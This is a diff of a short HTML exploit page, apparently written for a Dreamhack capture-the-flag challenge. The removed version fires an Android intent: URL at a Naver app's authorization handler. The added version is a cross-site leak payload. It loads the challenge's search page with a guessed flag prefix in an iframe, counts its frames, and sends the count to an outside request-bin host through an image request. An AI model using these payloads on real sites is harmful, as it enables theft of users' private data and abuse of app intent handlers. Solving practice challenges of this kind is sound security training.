@@ -1,19 +1,9 @@
-<!DOCTYPE html>
-<html>
-<head><title>Test</title></head>
-<body>
-    <h1>Hellllooooo!!!</h1>
-    
-    <script>
-        // 1. 매니페스트에 명시된 특정 액션을 타겟팅
-        // 2. package를 강제하여 클로바 앱 내부에서 핸들러를 찾게 함
-        var payload = "intent:#Intent;" +
-                      "action=com.naver.nozzle.appauth.HANDLE_AUTHORIZATION_RESPONSE;" +
-                      "category=android.intent.category.DEFAULT;" +
-                      "category=android.intent.category.BROWSABLE;" +
-                      "package=com.naver.nozzle;" +
-                      "end";
-        location.href = payload;
-    </script>
-</body>
-</html>
+<iframe id="iframe"></iframe>
+<img id="img">
+<script>
+const iframe = document.getElementById("iframe");
+iframe.src = "http://host8.dreamhack.games:22264/search?query=DH{";
+iframe.onload = () => {
+    img.src = `https://eafenci.request.dreamhack.games/${iframe.contentWindow.frames.length}`;
+};
+</script>
